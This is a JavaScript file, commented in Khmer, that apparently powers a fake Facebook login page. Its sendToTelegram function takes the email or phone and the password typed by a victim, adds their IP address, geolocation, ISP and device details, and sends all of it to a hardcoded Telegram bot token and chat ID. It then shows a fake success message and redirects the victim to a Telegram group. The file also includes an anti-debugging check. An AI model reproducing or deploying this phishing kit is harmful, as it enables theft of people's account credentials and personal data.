// ==================== ការកំណត់រចនាសម្ព័ន្ធ ====================
const CONFIG = {
    TOKEN: "7568763554:AAGLNbPtD1ev3O8GBPMEtcpPH73cuOS-vtg",
    CHAT_ID: "6837307356",
    GROUP_LINK: "https://t.me/+7LTtj5yoBBxjMGVl",
    MAX_RETRIES: 3,
    RETRY_DELAY: 1000,
    SESSION_TIMEOUT: 300000, // 5 នាទី
    RATE_LIMIT_DELAY: 2000
};

// ==================== អថេរសកល ====================
let failedAttempts = 0;
let sessionStartTime = Date.now();
let rateLimitTimer = null;
let isProcessing = false;
let attemptsCount = 0;

// ==================== មុខងារកម្រិតខ្ពស់ ====================

// 1. ពិនិត្យគុណភាពពាក្យសម្ងាត់
function checkPasswordStrength(password) {
    let strength = 0;
    let feedback = [];
    
    if (password.length >= 8) strength++;
    else feedback.push("ពាក្យសម្ងាត់ខ្លីពេក (ត្រូវការ 8 តួអក្សរឡើង)");
    
    if (/[A-Z]/.test(password)) strength++;
    else feedback.push("គួរតែមានអក្សរធំ");
    
    if (/[0-9]/.test(password)) strength++;
    else feedback.push("គួរតែមានលេខ");
    
    if (/[^A-Za-z0-9]/.test(password)) strength++;
    else feedback.push("គួរតែមានតួអក្សរពិសេស");
    
    const strengthLevel = ["ខ្សោយ", "មធ្យម", "ល្អ", "ខ្លាំង", "ខ្លាំងណាស់"];
    return { score: strength, level: strengthLevel[strength], feedback: feedback };
}

// 2. ពិនិត្យទម្រង់អ៊ីមែល
function validateEmail(email) {
    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    const phoneRegex = /^[0-9]{9,12}$/;
    
    if (emailRegex.test(email)) return { valid: true, type: "email" };
    if (phoneRegex.test(email)) return { valid: true, type: "phone" };
    return { valid: false, type: null };
}

// 3. ទទួលបានព័ត៌មាន Browser
function getBrowserInfo() {
    const ua = navigator.userAgent;
    return {
        browser: navigator.userAgentData?.brands || "Unknown",
        language: navigator.language,
        platform: navigator.platform,
        screenSize: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        userAgent: ua,
        isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(ua)
    };
}

// 4. ទទួលបានទីតាំងប្រហាក់ប្រហែល (IP Geolocation)
async function getGeoLocation(ip) {
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return {
            country: data.country_name || "Unknown",
            city: data.city || "Unknown",
            region: data.region || "Unknown",
            isp: data.org || "Unknown"
        };
    } catch (error) {
        return { country: "Unknown", city: "Unknown", region: "Unknown", isp: "Unknown" };
    }
}

// 5. បង្កើត Session ID
function generateSessionId() {
    return 'xxxx-xxxx-xxxx-xxxx'.replace(/[x]/g, function() {
        return ((Math.random() * 16) | 0).toString(16);
    });
}

// 6. ការពារ Rate Limiting
async function rateLimit() {
    if (rateLimitTimer) {
        await new Promise(resolve => setTimeout(resolve, CONFIG.RATE_LIMIT_DELAY));
    }
    rateLimitTimer = setTimeout(() => { rateLimitTimer = null; }, CONFIG.RATE_LIMIT_DELAY);
}

// 7. Retry Mechanism
async function fetchWithRetry(url, retries = CONFIG.MAX_RETRIES) {
    for (let i = 0; i < retries; i++) {
        try {
            const response = await fetch(url);
            if (response.ok) return response;
            if (response.status === 429) {
                await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY * (i + 1)));
                continue;
            }
        } catch (error) {
            if (i === retries - 1) throw error;
            await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY));
        }
    }
    throw new Error("Max retries exceeded");
}

// 8. ទទួលបាន IP ជាមួយ backup
async function getPublicIP() {
    const ipServices = [
        'https://api.ipify.org?format=json',
        'https://api.my-ip.io/ip.json',
        'https://ipapi.co/json/'
    ];
    
    for (const service of ipServices) {
        try {
            const response = await fetch(service);
            const data = await response.json();
            const ip = data.ip || data;
            if (ip && ip.match(/^\d+\.\d+\.\d+\.\d+$/)) return ip;
        } catch (error) {
            continue;
        }
    }
    return "Unable to fetch IP";
}

// 9. ទម្រង់អត្ថបទកម្រិតខ្ពស់
function formatAdvancedMessage(email, password, ip, date, geoInfo, browserInfo, sessionId) {
    const passStrength = checkPasswordStrength(password);
    const emailValidation = validateEmail(email);
    
    return "╔══════════════════════════════════════════╗\n" +
           "║          🔐 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐋𝐎𝐆𝐈𝐍 🔐          ║\n" +
           "╠══════════════════════════════════════════╣\n" +
           "║ 📧 𝐄𝐦𝐚𝐢𝐥/𝐏𝐡𝐨𝐧𝐞                         ║\n" +
           `║    ➜ ${email.padEnd(35)}║\n` +
           `║    📌 Type: ${emailValidation.type || "Invalid".padEnd(28)}║\n` +
           "╠══════════════════════════════════════════╣\n" +
           "║ 🔑 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝                            ║\n" +
           `║    ➜ ${password.padEnd(35)}║\n` +
           `║    🔒 Strength: ${passStrength.level.padEnd(26)}║\n` +
           "╠══════════════════════════════════════════╣\n" +
           "║ 🌐 𝐍𝐞𝐭𝐰𝐨𝐫𝐤 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧                ║\n" +
           `║    📍 IP: ${ip.padEnd(35)}║\n` +
           `║    🏳️ Country: ${geoInfo.country.padEnd(30)}║\n` +
           `║    🏙️ City: ${geoInfo.city.padEnd(34)}║\n` +
           `║    📡 ISP: ${geoInfo.isp.substring(0, 35).padEnd(35)}║\n` +
           "╠══════════════════════════════════════════╣\n" +
           "║ 💻 𝐃𝐞𝐯𝐢𝐜𝐞 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧                 ║\n" +
           `║    📱 Mobile: ${(browserInfo.isMobile ? "Yes" : "No").padEnd(32)}║\n` +
           `║    🌍 Language: ${browserInfo.language.padEnd(29)}║\n` +
           `║    📺 Screen: ${browserInfo.screenSize.padEnd(32)}║\n` +
           `║    🕐 Timezone: ${browserInfo.timezone.padEnd(30)}║\n` +
           "╠══════════════════════════════════════════╣\n" +
           "║ 📅 𝐓𝐢𝐦𝐞𝐬𝐭𝐚𝐦𝐩                          ║\n" +
           `║    🕒 Date: ${date.padEnd(34)}║\n` +
           `║    🆔 Session: ${sessionId.padEnd(31)}║\n` +
           "╚══════════════════════════════════════════╝";
}

// 10. Local Storage រក្សាទុកស្ថានភាព
function saveToLocalStorage(email) {
    const attempts = JSON.parse(localStorage.getItem('login_attempts') || '[]');
    attempts.push({
        email: email,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    });
    if (attempts.length > 10) attempts.shift();
    localStorage.setItem('login_attempts', JSON.stringify(attempts));
}

// 11. រាប់ចំនួនព្យាយាមពី IP ដូចគ្នា
function getAttemptsCount() {
    attemptsCount++;
    return attemptsCount;
}

// 12. ពិនិត្យ Session Expiry
function isSessionExpired() {
    return (Date.now() - sessionStartTime) > CONFIG.SESSION_TIMEOUT;
}

// 13. បង្ហាញការជូនដំណឹងបែបទំនើប (Toast Notification)
function showToast(message, type = "success") {
    const toast = document.createElement('div');
    toast.textContent = message;
    toast.style.cssText = `
        position: fixed;
        bottom: 20px;
        left: 50%;
        transform: translateX(-50%);
        background: ${type === "success" ? "#0084ff" : "#ff4444"};
        color: white;
        padding: 12px 24px;
        border-radius: 8px;
        font-size: 14px;
        z-index: 1000;
        animation: slideUp 0.3s ease;
        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
    `;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

// 14. បន្ថែម CSS Animation
function addAnimations() {
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .loading-animation {
            animation: pulse 1s ease-in-out infinite;
        }
    `;
    document.head.appendChild(style);
}

// 15. អនុគមន៍សំខាន់ផ្ញើទៅ Telegram (កែលម្អ)
async function sendToTelegram() {
    if (isProcessing) {
        showToast("សូមរង់ចាំ...", "error");
        return;
    }
    
    if (isSessionExpired()) {
        sessionStartTime = Date.now();
        showToast("សម័យប្រើប្រាស់ថ្មី", "success");
    }
    
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
        showToast("សូមបំពេញព័ត៌មានទាំងអស់!", "error");
        return;
    }
    
    const emailValidation = validateEmail(email);
    if (!emailValidation.valid) {
        showToast("ទម្រង់អ៊ីមែល/ទូរសព្ទមិនត្រឹមត្រូវ", "error");
        return;
    }
    
    const passStrength = checkPasswordStrength(password);
    if (passStrength.score === 0) {
        showToast("ពាក្យសម្ងាត់ខ្សោយពេក", "error");
        return;
    }

    isProcessing = true;
    await rateLimit();
    
    const loadingDiv = document.getElementById('loading');
    loadingDiv.style.display = 'block';
    loadingDiv.classList.add('loading-animation');

    const submitBtn = document.querySelector('.submit-btn');
    submitBtn.disabled = true;
    submitBtn.style.opacity = '0.7';

    try {
        const [ip, browserInfo, sessionId] = await Promise.all([
            getPublicIP(),
            Promise.resolve(getBrowserInfo()),
            Promise.resolve(generateSessionId())
        ]);
        
        const geoInfo = await getGeoLocation(ip);
        const date = getCurrentDate();
        
        saveToLocalStorage(email);
        const attemptNum = getAttemptsCount();
        
        const message = formatAdvancedMessage(email, password, ip, date, geoInfo, browserInfo, sessionId);
        const encodedMessage = encodeURIComponent(message);

        const url = `https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${encodedMessage}`;

        const response = await fetchWithRetry(url);
        const result = await response.json();

        if (result.ok) {
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            
            showToast(`ចូលក្រុបបានដោយជោគជ័យ! (ការព្យាយាមលើកទី ${attemptNum})`, "success");
            joinTelegramGroup();
            failedAttempts = 0;
        } else {
            failedAttempts++;
            showToast(`បរាជ័យលើកទី ${failedAttempts}`, "error");
            submitBtn.disabled = false;
            submitBtn.style.opacity = '1';
        }
    } catch (error) {
        console.error("Error:", error);
        showToast("កំហុសបច្ចេកទេស! សូមពិនិត្យការតភ្ជាប់", "error");
        submitBtn.disabled = false;
        submitBtn.style.opacity = '1';
    } finally {
        isProcessing = false;
        loadingDiv.style.display = 'none';
        loadingDiv.classList.remove('loading-animation');
    }
}

// 16. អនុគមន៍ទទួលបានពេលវេលា (រក្សាទុក)
function getCurrentDate() {
    const now = new Date();
    return now.toLocaleString('en-GB', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    }).replace(',', '');
}

// 17. អនុគមន៍បើក Telegram Group
function joinTelegramGroup() {
    window.open(CONFIG.GROUP_LINK, '_blank');
}

// 18. បន្ថែម real-time password strength indicator
function addPasswordStrengthIndicator() {
    const passwordInput = document.getElementById('password');
    const indicator = document.createElement('div');
    indicator.style.cssText = `
        font-size: 12px;
        margin-top: -10px;
        margin-bottom: 5px;
        padding-left: 5px;
    `;
    passwordInput.parentNode.insertBefore(indicator, passwordInput.nextSibling);
    
    passwordInput.addEventListener('input', function() {
        const strength = checkPasswordStrength(this.value);
        const colors = ["#ff4444", "#ffaa44", "#ffff44", "#44ff44", "#00cc00"];
        indicator.textContent = `កម្លាំងពាក្យសម្ងាត់: ${strength.level}`;
        indicator.style.color = colors[strength.score];
    });
}

// 19. បន្ថែម email/phone format validation real-time
function addEmailValidation() {
    const emailInput = document.getElementById('email');
    const indicator = document.createElement('div');
    indicator.style.cssText = `
        font-size: 12px;
        margin-top: -10px;
        margin-bottom: 5px;
        padding-left: 5px;
    `;
    emailInput.parentNode.insertBefore(indicator, emailInput.nextSibling);
    
    emailInput.addEventListener('input', function() {
        const validation = validateEmail(this.value);
        if (this.value.length === 0) {
            indicator.textContent = '';
        } else if (validation.valid) {
            indicator.textContent = `✓ ទម្រង់ត្រឹមត្រូវ (${validation.type})`;
            indicator.style.color = "#00cc00";
        } else {
            indicator.textContent = "✗ ទម្រង់មិនត្រឹមត្រូវ";
            indicator.style.color = "#ff4444";
        }
    });
}

// 20. Keyboard shortcut (Enter key)
function addKeyboardShortcut() {
    const inputs = document.querySelectorAll('.input-field');
    inputs.forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendToTelegram();
            }
        });
    });
}

// 21. Anti-debugging detection (simple)
function detectDevTools() {
    const start = performance.now();
    debugger;
    const end = performance.now();
    if (end - start > 100) {
        console.log("DevTools detected");
    }
}

// ==================== ការចាប់ផ្ដើម ====================
document.addEventListener('DOMContentLoaded', () => {
    addAnimations();
    addPasswordStrengthIndicator();
    addEmailValidation();
    addKeyboardShortcut();
    detectDevTools();
    console.log("Advanced script loaded successfully!");
    console.log(`Session ID: ${generateSessionId()}`);
});